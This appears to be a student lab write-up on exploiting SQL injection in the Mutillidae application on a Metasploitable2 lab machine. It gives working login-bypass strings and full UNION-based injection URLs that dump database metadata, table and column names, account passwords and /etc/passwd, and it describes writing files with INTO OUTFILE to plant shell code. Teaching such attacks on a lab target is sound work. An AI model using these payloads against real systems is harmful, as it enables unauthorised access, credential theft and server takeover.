# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2

![244885508-4c83fc80-0108-44d7-92b8-b6292ec99686](https://github.com/prithviraj5703/sqlinjection/assets/121418418/cf41f526-8afb-43a3-8785-9bd22d3f0157)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser. 

![244886609-81aa3c6a-fd5d-4b8f-8656-b921cd05e1f4](https://github.com/prithviraj5703/sqlinjection/assets/121418418/4af4607e-507a-4349-8e0d-95b22ff09b68)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![244885516-65d72597-0297-485a-8c57-d335bf885ba6](https://github.com/prithviraj5703/sqlinjection/assets/121418418/68a42b44-44c9-49dc-be56-cf596ef7acf0)

Click on the menu Login/Register and register for an account

![244885618-dfe4513c-3c0d-43e0-b1e4-ad4baee43b98](https://github.com/prithviraj5703/sqlinjection/assets/121418418/39c05f96-f0f0-4593-bfc9-2f9e37517fb0)

Click on the link “Please register here” 

![244885627-abd46fae-74a4-48e7-9f95-8eb1470cfe3c](https://github.com/prithviraj5703/sqlinjection/assets/121418418/9b47bcf4-52a0-4f3a-87f4-16cad4d123d1)


Click on “Create Account” to display the following page: 

![244885637-499aca4d-391b-4f0e-ac33-31ace3337955](https://github.com/prithviraj5703/sqlinjection/assets/121418418/93bd2308-8d79-4193-adcb-d6beb8f12cf6)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![244885646-8ae683e6-f569-42f3-9c38-82bc3f9e6f41](https://github.com/prithviraj5703/sqlinjection/assets/121418418/8a20a3a2-3024-4937-a6d8-32b76a1d98b6)

Click “Login”. The logged in page will show as below: Screenshot 2023-06-10 223535

![244885649-037084b7-47fb-40ac-85cc-43f91dde84b5](https://github.com/prithviraj5703/sqlinjection/assets/121418418/573707c5-358f-4496-abc2-54d516ede62a)

##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![244885654-cb326fd0-509f-4df9-b97d-8a65bf1f0716](https://github.com/prithviraj5703/sqlinjection/assets/121418418/df311667-7bb6-49ef-a909-c9114dc140b4)

Click the login button and you will see it enter into the administrator page. 

![244885664-ac33b189-494b-4a5f-bce2-b840ab35e5fc](https://github.com/prithviraj5703/sqlinjection/assets/121418418/9939eca2-ca5c-44cc-ae56-2cdcaa008048)

### Union-based SQL injection

UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below: img

![244885675-123993df-2a2b-455f-abde-8904a72314dd](https://github.com/prithviraj5703/sqlinjection/assets/121418418/a6df8cc6-69f5-4d96-ba22-a8a3c310a8d2)


![244885683-7b70cf08-aa04-4ba1-b7e5-12f048c98c57](https://github.com/prithviraj5703/sqlinjection/assets/121418418/727d0456-30ab-4f10-ba1b-087e7982bfd3)


![244885834-a242176f-df4f-4eb2-8296-0671fd7d7264](https://github.com/prithviraj5703/sqlinjection/assets/121418418/66e96b38-3353-4d1d-a3b4-4e5b8ac90461)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned. 

![244885838-10c8f015-3770-46b5-b320-bf37cc7bbdae](https://github.com/prithviraj5703/sqlinjection/assets/121418418/d775536f-dae9-4b0c-91bb-0ca04abd2477)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![244885847-0eb340b9-63a6-433e-878b-45f3b396f1a2](https://github.com/prithviraj5703/sqlinjection/assets/121418418/1b99ba37-bb8a-46ed-90c5-5392c54e386c)

After adding the order by 6 into the existing url , the following error statement will be obtained: 

![244885847-0eb340b9-63a6-433e-878b-45f3b396f1a2](https://github.com/prithviraj5703/sqlinjection/assets/121418418/c76cd64f-ccc2-407a-9937-bd86c025eec3)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6. 

![244885848-86073e2f-937b-47a4-9b9d-c0c2863b2a7c](https://github.com/prithviraj5703/sqlinjection/assets/121418418/33d0d93a-1eb4-404a-9167-9db586cb6a19)

As it is having 5 columns the query worked fine and it provides the correct result

![244885850-7a660480-5cb6-4d86-acd1-08f7a4d5e2fa](https://github.com/prithviraj5703/sqlinjection/assets/121418418/eaa242b4-ffea-40e0-8d41-944b16825da3)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)

![244885874-1c7ac260-3410-4f75-8091-2cda6b7f20c0](https://github.com/prithviraj5703/sqlinjection/assets/121418418/b711a35a-66d1-434a-97cc-bb6036cd8d0e)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information. 

![244885894-12ebac90-8efb-4558-a442-541029220fa3](https://github.com/prithviraj5703/sqlinjection/assets/121418418/39ed21c1-591d-45f1-b660-f168c4ea0dd0)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![244885896-78ba6fc7-7ab6-4c39-8a7f-c8e4240775b8](https://github.com/prithviraj5703/sqlinjection/assets/121418418/94931dcd-29da-4a69-97ec-658fee28a2cf)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![244885899-68ccd33b-a98d-4ff6-8c19-57e63c2724d0](https://github.com/prithviraj5703/sqlinjection/assets/121418418/93938e13-ce4b-42f4-ad6e-fa424526b9ad)

The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

![244885902-c820f87a-30cb-485b-b423-f6fd0e67c96e](https://github.com/prithviraj5703/sqlinjection/assets/121418418/da8cc123-93fe-4f34-8616-e55f453ce843)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details

![244885902-c820f87a-30cb-485b-b423-f6fd0e67c96e](https://github.com/prithviraj5703/sqlinjection/assets/121418418/68902440-2af2-4a38-b9ed-eb52a735fe99)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![244885903-f7dd79fb-c11c-41f3-8019-06685e9cd759](https://github.com/prithviraj5703/sqlinjection/assets/121418418/42c5fdf8-8521-4609-9067-e55df381f746)

### Reading and writing files on the web-server

We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![244885909-13f4a113-06fc-4d62-a8ec-6525c4ec1343](https://github.com/prithviraj5703/sqlinjection/assets/121418418/1571c9ec-354d-4b9f-a4e7-1584e0a4b9d8)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
